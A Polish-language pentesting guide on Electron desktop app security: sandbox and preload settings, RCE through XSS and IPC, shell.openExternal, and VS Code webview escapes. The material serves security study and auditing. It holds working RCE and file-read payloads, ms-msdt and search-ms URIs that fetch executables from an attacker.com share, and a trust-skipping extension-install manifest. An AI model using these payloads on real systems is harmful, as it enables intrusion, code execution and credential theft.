# Aplikacje desktopowe Electron

{{#include ../../banners/hacktricks-training.md}}

## Wprowadzenie

Electron łączy uprzywilejowany proces główny **Node.js** z procesami renderer **Chromium**. Electron nie jest przeglądarką internetową: kod aplikacji może celowo udostępniać takie możliwości jak dostęp do systemu plików i powłoki, dlatego ładowanie niezaufanych treści wymaga bardziej rygorystycznego projektowania granic bezpieczeństwa niż w przypadku zwykłej witryny.<sup>[[21]](#references)</sup>

Kod aplikacji Electron jest zwykle pakowany w archiwum `.asar`. Przed przejrzeniem kodu źródłowego rozpakuj je:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Plik `package.json` aplikacji wskazuje jej główny punkt wejścia. Zazwyczaj tworzy on okna renderera i ustawia ich wrażliwe z punktu widzenia bezpieczeństwa opcje `webPreferences`.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron ma dwa główne typy procesów:

- Main Process (ma pełny dostęp do NodeJS)
- Renderer Process (ze względów bezpieczeństwa powinien mieć ograniczony dostęp do NodeJS)

![Electron Desktop Apps - Introduction: Renderer Process (ze względów bezpieczeństwa powinien mieć ograniczony dostęp do NodeJS)](<../../images/image (182).png>)

**Renderer Process** to okno przeglądarki wczytujące plik:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**Proces główny** konfiguruje każdy proces renderer, zwykle podczas tworzenia `BrowserWindow`. Bezpieczne ustawienia zmniejszają ryzyko, że przejęcie renderer doprowadzi do wykonania natywnego kodu, ale same w sobie nie sprawiają, że niezaufana zawartość staje się bezpieczna.<sup>[[21]](#references)[[22]](#references)</sup>

Sprawdź co najmniej te preferencje renderer:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** ma domyślnie wartość `false`. Włączenie tej opcji daje JavaScriptowi renderer dostęp do API Node.js, a także wyłącza sandbox tego renderer.
- **`contextIsolation`** ma domyślnie wartość `true`. Oddziela kontekst JavaScript strony od kontekstu używanego przez skrypty preload i elementy wewnętrzne Electron.
- **`preload`** nie ma domyślnej ścieżki. Skonfigurowany skrypt preload jest uruchamiany przed skryptami strony i może udostępniać ściśle ograniczone API za pomocą `contextBridge`.
- **`sandbox`** ma domyślnie wartość `true` od Electron 20. Ogranicza dostęp renderer do zasobów systemu operacyjnego; ustawienie `nodeIntegration: true` wyłącza tę opcję.
- **`nodeIntegrationInWorker`** ma domyślnie wartość `false` i kontroluje integrację Node.js w Web Workers.
- **`nodeIntegrationInSubFrames`** ma domyślnie wartość `false`.
  - Jeśli **`nodeIntegration`** jest **włączone**, umożliwia to używanie **API Node.js** na stronach internetowych **załadowanych w iframe** w aplikacji Electron.
  - Jeśli **`nodeIntegration`** jest **wyłączone**, skrypty preload będą ładowane w iframe.

Przykład konfiguracji:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Niektóre **payloady RCE** z [tego miejsca](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Przechwytywanie ruchu

Zmodyfikuj konfigurację start-main i dodaj użycie proxy, takiego jak:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Statyczne śledzenie granicy ASAR–native za pomocą REA

**REA** może odczytać plik ASAR lub wypakowany katalog aplikacji bez uruchamiania jej JavaScript bootstrap. Graf aplikacji rejestruje punkty wejścia pakietów, zbundlowane moduły, ustawienia `BrowserWindow` i preload, elementy `contextBridge`, rejestracje IPC, żądania natywnych dodatków oraz identyfikatory source map. Dzięki temu można rozpocząć śledzenie możliwości udostępnionej rendererowi aż do uprzywilejowanego handlera w głównym procesie.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

W przypadku dosłownego ciągu funkcji przekaż cały rekord Evidence jako `application` i zastąp seed wartością zaobserwowaną w aplikacji docelowej:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Ten sam workflow `trace_application_feature` akceptuje również zaobserwowany literał będący członkiem API, kanałem IPC lub modułem jako punkt startowy. Sprawdź wynikową ścieżkę handlera, kandydatów walidacji i przekazanie do kodu natywnego w odniesieniu do zwróconych lokalizacji w kodzie źródłowym. Wywołanie rendererowego `invoke` można powiązać tylko z jednym unikalnym kandydatem `ipcMain.handle`/`handleOnce` używającym dokładnie tego samego literału kanału; `send` podobnie wymaga jednego unikalnego kandydata `ipcMain.on`/`once`/`addListener`. Dynamiczne lub zduplikowane handlery pozostają nierozstrzygnięte. Żądany element `.node` nie jest zweryfikowanym eksportem natywnym; dowody z Hopper/Ghidra muszą mieć ten sam digest artefaktu, zanim wyciągniesz taki wniosek. Statyczna osiągalność nie dowodzi też, że ścieżka została wykonana.<sup>[[24]](#references)[[25]](#references)</sup>

Informacje o granicy zaufania między rendererem a procesem głównym oraz walidacji handlerów znajdziesz w [RCE przez IPC z Electron contextIsolation](electron-contextisolation-rce-via-ipc.md).

Informacje o dalszej analizie natywnej z użyciem providera znajdziesz w [Narzędzia do inżynierii wstecznej i podstawowe metody](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Powierzchnia ataku związana z automatycznymi aktualizacjami Electron

Informacje o integralności kanału wydań, rollbacku, pomyleniu podpisanych kanałów i TOCTOU pliku stagingowego znajdziesz w [Granicach zaufania automatycznych aktualizacji Electron](electron-auto-update-trust-boundaries.md).

## Lokalne wstrzykiwanie kodu w Electron

Jeśli masz dostęp do zapisu lokalnego lub instrumentacji zainstalowanej aplikacji, zobacz [Lokalne wstrzykiwanie kodu i manipulowanie snapshotem w Electron](electron-local-code-injection-and-snapshot-tampering.md), aby poznać ścieżki związane z ASAR/procesem głównym i snapshotem V8, a także odnośniki specyficzne dla systemu operacyjnego.

## RCE: XSS + nodeIntegration

Jeśli **nodeIntegration** jest ustawione na **on**, JavaScript strony internetowej może z łatwością korzystać z funkcji Node.js, po prostu wywołując `require()`. Na przykład aplikację calc można uruchomić w systemie Windows w następujący sposób:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Skrypt wskazany w tym ustawieniu jest **wczytywany przed innymi skryptami w rendererze**, więc ma **nieograniczony dostęp do Node APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Dlatego skrypt może eksportować node-features na strony:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Jeśli `contextIsolation` jest włączone, to nie zadziała**

## RCE: XSS + contextIsolation

_**contextIsolation**_ wprowadza **oddzielne konteksty dla skryptów strony internetowej i wewnętrznego kodu JavaScript Electrona**, dzięki czemu wykonywanie JavaScriptu w jednym kodzie nie wpływa na drugi. Jest to niezbędna funkcja, która eliminuje możliwość RCE.

Jeśli konteksty nie są izolowane, atakujący może:

1. Wykonać **dowolny JavaScript w rendererze** (XSS lub nawigacja do zewnętrznych witryn)
2. **Nadpisać wbudowaną metodę** używaną w kodzie preload lub wewnętrznym kodzie Electrona własną funkcją
3. **Wywołać** użycie **nadpisanej funkcji**
4. RCE?

Istnieją 2 miejsca, w których można nadpisać wbudowane metody: kod preload lub wewnętrzny kod Electrona:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Ominięcie przez kliknięcie

Jeśli po kliknięciu linku obowiązują ograniczenia, być może uda Ci się je **ominąć, klikając środkowym przyciskiem myszy** zamiast zwykłym lewym przyciskiem.

```javascript
window.addEventListener('click', (e) => {
```

## RCE przez shell.openExternal

Więcej informacji o tych przykładach znajdziesz w [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) oraz [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Podczas wdrażania aplikacji Electron na komputery stacjonarne kluczowe jest zapewnienie prawidłowych ustawień `nodeIntegration` i `contextIsolation`. Wiadomo, że przy zastosowaniu tych ustawień skutecznie zapobiega się **zdalnemu wykonaniu kodu (RCE) po stronie klienta**, którego celem są skrypty preload lub natywny kod Electron uruchamiany z procesu głównego.

Gdy użytkownik klika łącza lub otwiera nowe okna, uruchamiane są określone nasłuchiwacze zdarzeń, które mają kluczowe znaczenie dla bezpieczeństwa i funkcjonalności aplikacji:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Te listenery są **nadpisywane przez aplikację desktopową**, aby zaimplementować jej własną **logikę biznesową**. Aplikacja ocenia, czy nawigowany link powinien zostać otwarty wewnętrznie, czy w zewnętrznej przeglądarce internetowej. Decyzja ta jest zazwyczaj podejmowana przez funkcję `openInternally`. Jeśli ta funkcja zwróci `false`, oznacza to, że link powinien zostać otwarty zewnętrznie za pomocą funkcji `shell.openExternal`.

**Oto uproszczony pseudokod:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Zalecenia dotyczące bezpieczeństwa Electron JS odradzają przekazywanie niezaufanych treści do funkcji `openExternal`, ponieważ może to prowadzić do RCE za pośrednictwem różnych protokołów. Systemy operacyjne obsługują różne protokoły, które mogą wywołać RCE. Szczegółowe przykłady i dalsze wyjaśnienia na ten temat można znaleźć w [tym źródle](https://positive.security/blog/url-open-rce#windows-10-19042), które zawiera przykłady protokołów Windows umożliwiających wykorzystanie tej podatności.<sup>[[10]](#references)</sup>

W macOS funkcję `openExternal` można wykorzystać do wykonania dowolnych poleceń, na przykład `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Przykłady exploitów wykorzystujących protokoły Windows obejmują:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + podatny preload IPC + shell.openExternal

Tę podatność można znaleźć w **[tym raporcie](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** to **przestarzała funkcja**, która umożliwia użycie **NodeJS** w **procesie renderer**. Należy ją wyłączyć, ponieważ umożliwia załadowanie skryptu w kontekście preload, na przykład tak:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Dlatego atakujący, któremu uda się załadować dowolną stronę, może użyć tego tagu, aby **załadować dowolny preload script**.

Następnie nadużyto tego preload scriptu, aby wywołać **podatną usługę IPC (`skype-new-window`)**, która wywoływała **`shell.openExternal`**, uzyskując RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Odczytywanie plików wewnętrznych: XSS + contextIsolation

**Wyłączenie `contextIsolation` umożliwia używanie tagów `<webview>`**, podobnie jak `<iframe>`, do odczytywania i eksfiltracji plików lokalnych. Przykład pokazuje, jak wykorzystać tę lukę do odczytania zawartości plików wewnętrznych:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Odczytywanie plików wewnętrznych: XSS + contextIsolation: Wyłączenie contextIsolation umożliwia używanie tagów , podobnie jak , do...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Ponadto przedstawiono inną metodę **odczytywania pliku wewnętrznego**, wskazującą na krytyczną lukę umożliwiającą odczyt plików lokalnych w aplikacji Electron. Polega ona na wstrzyknięciu skryptu w celu wykorzystania aplikacji i eksfiltracji danych:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + stary Chromium**

Jeśli wersja **Chromium** dołączona do aplikacji jest stara i zawiera znane luki, można spróbować ją wykorzystać i przekształcić XSS w RCE.<sup>[[20]](#references)</sup>\
Przykład znajdziesz w tym **writeupie**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Phishing przez XSS za pomocą obejścia regexu wewnętrznego URL**

Jeśli znajdziesz XSS, ale **nie możesz wywołać RCE ani wykraść plików wewnętrznych**, nadal możesz spróbować **wykraść dane logowania za pomocą phishingu**.<sup>[[1]](#references)</sup>

Najpierw sprawdź kod frontendu, aby ustalić, co się dzieje po otwarciu nowego URL:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Wywołanie **`openInternally`** decyduje, czy link do platformy otworzy się w **oknie aplikacji desktopowej**, czy zasób zewnętrzny otworzy się w przeglądarce systemowej.

Jeśli można obejść regex z listą dozwolonych adresów URL funkcji — na przykład dlatego, że kropki w nazwie hosta nie zostały poprzedzone znakami ucieczki — atakujący może wykorzystać XSS, aby wyświetlić na kontrolowanej przez siebie infrastrukturze wiarygodnie wyglądający monit o podanie danych logowania:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## Protokół `file://`

Jak wspomniano w [przewodniku bezpieczeństwa Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), strony działające przez **`file://`** mają szeroki dostęp do plików. W konsekwencji **XSS może umożliwić wczytywanie dowolnych plików** z komputera użytkownika. Prawidłowo zaprojektowany **custom protocol** może ograniczyć dostęp do określonego zestawu plików.<sup>[[21]](#references)</sup>

## Moduł Remote

Moduł Electron Remote pozwala **procesom renderera uzyskiwać dostęp do API procesu głównego**, ułatwiając komunikację w aplikacji Electron. Włączenie tego modułu wiąże się jednak ze znacznym ryzykiem dla bezpieczeństwa. Poszerza powierzchnię ataku aplikacji, zwiększając jej podatność na luki, takie jak ataki cross-site scripting (XSS).

> [!TIP]
> Chociaż moduł **remote** udostępnia procesom renderera niektóre API z procesu głównego, samo nadużycie tych komponentów nie wystarczy, by łatwo uzyskać RCE. Mogą one jednak ujawniać poufne informacje.

> [!WARNING]
> Wiele aplikacji, które nadal korzystają z modułu remote, robi to w sposób **wymagający włączenia NodeIntegration** w procesie renderera, co stanowi **ogromne zagrożenie dla bezpieczeństwa**.

Wbudowany moduł `remote` w Electron został najpierw oznaczony jako przestarzały, a następnie usunięty. Aplikacje, które nadal potrzebują tego modelu, mogą używać osobnego pakietu `@electron/remote`. Ze względu na konsekwencje dla bezpieczeństwa i wydajności unikaj udostępniania rendererom niezaufanym możliwości podobnych do remote.

W przypadku `@electron/remote` należy najpierw **zainicjować go w procesie głównym**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Proces renderera może następnie importować obiekty z modułu:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[Wpis na blogu](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** wskazuje kilka interesujących **funkcji** udostępnianych przez obiekt **`app`** z modułu remote:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Uruchamia ponownie** aplikację, **zamykając** bieżącą instancję i **uruchamiając** nową. Przydatne w przypadku **aktualizacji aplikacji** lub istotnych **zmian stanu**.
- **`app.setAppLogsPath([path])`**  
   - **Definiuje** lub **tworzy** katalog do przechowywania **logów aplikacji**. Logi można **pobrać** lub **zmodyfikować** za pomocą **`app.getPath()`** lub **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Rejestruje** bieżący plik wykonywalny jako **domyślną aplikację obsługującą** określony **protokół**. W razie potrzeby można podać **niestandardową ścieżkę** i **argumenty**.
- **`app.setUserTasks(tasks)`**  
   - **Dodaje** zadania do kategorii **Tasks** na **Jump List** (w systemie Windows). Każde zadanie może określać sposób **uruchamiania** aplikacji lub przekazywane **argumenty**.
- **`app.importCertificate(options, callback)`**  
   - **Importuje** **certyfikat PKCS#12** do systemowego **magazynu certyfikatów** (tylko Linux). Do obsługi wyniku można użyć funkcji **callback**.
- **`app.moveToApplicationsFolder([options])`**  
   - **Przenosi** aplikację do folderu **Applications** (w systemie macOS). Pomaga zapewnić użytkownikom komputerów Mac **standardową instalację**.
- **`app.setJumpList(categories)`**  
   - **Ustawia** lub **usuwa** niestandardową **Jump List** w systemie **Windows**. Można określić **kategorie**, aby uporządkować sposób wyświetlania zadań użytkownikowi.
- **`app.setLoginItemSettings(settings)`**  
   - **Konfiguruje**, które **pliki wykonywalne** są uruchamiane **podczas logowania**, wraz z ich **opcjami** (tylko macOS i Windows).
  
Przykład:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## moduł systemPreferences

**Główne API** służące do uzyskiwania dostępu do preferencji systemowych i **emitowania zdarzeń systemowych** w Electron. Metody takie jak **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** i **setUserDefault** są **częścią** tego modułu.

**Przykładowe użycie:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Nasłuchuje** natywnych powiadomień macOS za pomocą NSDistributedNotificationCenter.  
* Przed **macOS Catalina** można było przechwytywać **wszystkie** rozproszone powiadomienia, przekazując **nil** do CFNotificationCenterAddObserver.  
* Po **Catalina / Big Sur** aplikacje w sandboxie nadal mogą **subskrybować** **wiele zdarzeń** (na przykład **blokowanie/odblokowywanie ekranu**, **montowanie woluminów**, **aktywność sieciową** itp.), rejestrując powiadomienia **według nazwy**.

### **getUserDefault / setUserDefault**

* **Udostępnia interfejs** do **NSUserDefaults**, który przechowuje preferencje **aplikacji** lub **globalne** w macOS.
    
* **getUserDefault** może **pobierać** poufne informacje, takie jak **lokalizacje ostatnio używanych plików** lub **położenie geograficzne użytkownika**.
    
* **setUserDefault** może **modyfikować** te preferencje, potencjalnie wpływając na **konfigurację** aplikacji.
    
* W **starszych wersjach Electron** (przed v8.3.0) dostępny był tylko **standardowy zestaw** NSUserDefaults.

## Shell.showItemInFolder

Ta funkcja pokazuje wskazany plik w menedżerze plików. Na podatnych platformach i w podatnych wersjach ta interakcja **mogła automatycznie uruchomić plik**.

Więcej informacji: [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Aplikacje Electron powinny mieć **Content Security Policy (CSP)**, aby **zapobiegać atakom XSS**. **CSP** to **standard bezpieczeństwa**, który pomaga **zapobiegać** **wykonywaniu** **niezaufanego kodu** w przeglądarce.

Zwykle konfiguruje się ją w pliku **`main.js`** lub szablonie **`index.html`**, umieszczając CSP w **tagu meta**.

Więcej informacji:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + zaufanie do postMessage + ładowanie plików lokalnych (VS Code 1.63)

Ten łańcuch ataku z prawdziwego świata dotyczył Visual Studio Code 1.63 (CVE-2021-43908) i pokazuje, jak pojedynczy atak XSS wywołany przez markdown w webview może zostać eskalowany do pełnego RCE, gdy CSP, postMessage i handlery schematów są nieprawidłowo skonfigurowane. Publiczne PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Przegląd łańcucha ataku
- Pierwszy atak XSS przez CSP webview: wygenerowana CSP zawierała `style-src 'self' 'unsafe-inline'`, co umożliwiało wstrzyknięcie oparte na stylach/inline w kontekście `vscode-webview://`. Payload wysyłał sygnał do `/stealID`, aby eksfiltrować extensionId docelowego webview.
- Konstruowanie docelowego URL webview: wykorzystanie leaked ID do zbudowania `vscode-webview://<extensionId>/.../<publicUrl>`.
- Drugi atak XSS przez zaufanie do postMessage: zewnętrzny webview ufał `window.postMessage` bez ścisłej weryfikacji origin/type i ładował HTML atakującego z `allowScripts: true`.
- Ładowanie pliku lokalnego przez przepisywanie schematu/ścieżki: payload przepisywał `file:///...` na `vscode-file://vscode-app/...` i podmieniał `exploit.md` na `RCE.html`, wykorzystując słabą walidację ścieżki do załadowania uprzywilejowanego zasobu lokalnego.
- RCE w kontekście z włączonym Node: załadowany HTML wykonywał się z dostępem do API Node, umożliwiając wykonywanie poleceń systemu operacyjnego.

Przykładowy prymityw RCE w końcowym kontekście
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Powiązana lektura na temat problemów z zaufaniem w `postMessage`:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: syntetyczne skróty webview + deklaratywne mosty poleceń rozszerzeń

W czerwcu 2026 r. pojawiła się inna klasa ucieczek z webview VS Code: **niezaufany JavaScript wewnątrz webview notatnika/podglądu mógł syntetyzować uprzywilejowane skróty globalne**, ponieważ preload webview przekazywał dane `keydown` do hosta workbench, a host obsługiwał je jak prawdziwe dane wejściowe użytkownika.<sup>[[14]](#references)</sup>

Jest to część szerszej historii ataków na granice zaufania w IDE, w których treści kontrolowane przez projekt docierają do uprzywilejowanych funkcji edytora.<sup>[[19]](#references)</sup>

### Błąd granicy zaufania

Jeśli webview działające w innej domenie lub w piaskownicy kopiuje kontrolowane przez atakującego pola klawiatury (`key`, `code`, `keyCode`, modyfikatory, `repeat`) do uprzywilejowanego mostu `postMessage`/message-port **bez sprawdzenia `event.isTrusted`**, JavaScript wewnątrz webview może uruchamiać skróty workbench za pomocą:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

This is especially useful when **synthetic typing is blocked** by the browser. Scripted key events usually **cannot type arbitrary text into HTML `<input>` elements**, but they can still trigger shortcuts that consume `keydown` directly.

### Praktyczne wzorce nadużyć

- **Nadużywanie interfejsu opartego na skrótach:** zamiast próbować wpisywać polecenia, celuj w globalne skróty, takie jak akceptowanie powiadomień, nawigacja po palecie, aktywowanie przycisku z fokusem lub poruszanie się po menu.
- **Przewidywalne uprzywilejowane monity na podstawie metadanych obszaru roboczego:** kontrolowany przez repozytorium plik `.vscode/extensions.json` może rekomendować rozszerzenie atakującego i wywołać przewidywalne powiadomienie o instalacji, które można zaakceptować skrótem, takim jak `Ctrl+Shift+A`.
- **Deklaratywny manifest rozszerzenia jako most poleceń:** nawet jeśli kod lokalnego rozszerzenia obszaru roboczego jest blokowany przez CSP w webowym VS Code, deklaratywne wpisy `package.json` mogą nadal zostać załadowane. Lokalne rozszerzenie w `.vscode/extensions` może zarejestrować skrót klawiszowy, który wywołuje `runCommands`, a następnie uprzywilejowane polecenie wewnętrzne, takie jak `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Przykładowy wzorzec manifestu:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Ukryte flagi bezpieczeństwa dostępne przez niezaufane metadane:** jeśli wewnętrzne polecenie akceptuje kontrolowane przez atakującego argumenty, takie jak `{"context":{"skipPublisherTrust":true}}`, deklaratywne metadane mogą pominąć okno dialogowe zaufania i zainstalować rozszerzenie hostowane w Marketplace/CDN, które ostatecznie wykona kod atakującego.
- **Nadużycie zaufanego workspace:** jeśli zdalne/webowe workspace’y są automatycznie uznawane za zaufane, rozszerzenia z lokalnego workspace stają się cennym pomostem między zawartością repozytorium a uprzywilejowanymi działaniami edytora.
- **Zwiększenie zakresu dostępu po przejęciu:** po uruchomieniu rozszerzenia sprawdź, jakie tokeny edytor udostępnia rozszerzeniom. W `github.dev` skradziony token GitHub był ważny także poza otwartym repozytorium, więc zapytanie do `https://api.github.com/user/repos` pozwalało wyliczyć inne dostępne prywatne repozytoria.

### Uwagi z audytu

- Traktuj **przekazywanie danych wejściowych z webview do hosta** jako granicę uprawnień; nigdy nie przekazuj dalej do hosta syntetycznych zdarzeń klawiszy/kliknięć pochodzących z niezaufanych ramek.
- Wymuszaj autoryzację **wewnątrz** wrażliwych poleceń. Nie akceptuj dostarczanego przez wywołującego kontekstu polecenia, który może ustawiać wewnętrzne flagi, takie jak `skipPublisherTrust`.
- Nie zakładaj, że zablokowanie wykonywalnego lokalnego kodu rozszerzeń wystarczy; sprawdź również **deklaratywne elementy** (`keybindings`, `menus`, `commands`, zadania) z manifestów kontrolowanych przez workspace.
- Poprawki z 3 czerwca 2026 r. dodały `isTrusted` do przekazywanych zdarzeń, wyłączyły przekazywanie niezaufanych zdarzeń klawiatury w webview notebooków i przestały akceptować kontekst polecenia instalacji dostarczany przez wywołującego.<sup>[[16]](#references)[[17]](#references)</sup>

## **Narzędzia**

Wyselekcjonowany zbiór **awesome-electronjs-hacking** zawiera dodatkowe materiały badawcze, narzędzia i zasoby dotyczące podatnych aplikacji.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) to narzędzie do wykrywania błędnych konfiguracji i antywzorców bezpieczeństwa w aplikacjach opartych na Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) to wtyczka open source do VS Code dla aplikacji Electron, która korzysta z Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) sprawdza podatne biblioteki innych firm.
- [**Electro.ng**](https://electro.ng/) to komercyjne narzędzie do analizy bezpieczeństwa Electron.

## Laboratoria

Pod adresem [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) znajdziesz laboratorium dotyczące wykorzystywania podatnych aplikacji Electron.<sup>[[4]](#references)</sup>

Te polecenia pomogą Ci przejść przez laboratorium:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
